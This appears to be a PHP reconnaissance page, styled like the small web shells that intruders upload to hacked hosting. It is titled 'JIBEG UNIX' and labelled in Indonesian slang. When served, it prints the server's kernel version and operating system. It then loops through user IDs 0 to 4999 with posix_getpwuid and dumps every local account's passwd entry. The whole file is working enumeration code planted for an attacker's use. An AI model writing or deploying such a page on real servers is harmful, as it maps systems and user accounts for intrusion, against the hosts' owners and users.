<title>JIBEG</title>
<body bgcolor="#111" text="yellow" a,link="orange">
<center><br>
[x] JIBEG UNIX [x]
<hr>
</center>
<left>
Cek kernel bos : <br>
<?php
echo php_uname();
?>
<br>
 <hr>
<br>
Cek sistem operasi bos :<br>
<?php
echo PHP_OS;
?>
<br>
<hr>
<br>

Cek User linux di server / hosting bos :<br>
<?php
for ($uid = 0; $uid < 5000; $uid++) { 
  $x = posix_getpwuid($uid); 
  if (!empty($x)) { 
    while (list($kunci, $cek) = each($x)) { print "{$cek}:"; } print "<br />"; 
  }
}
?>
<center><br><hr>
[x] JIBEG UNIX [x]
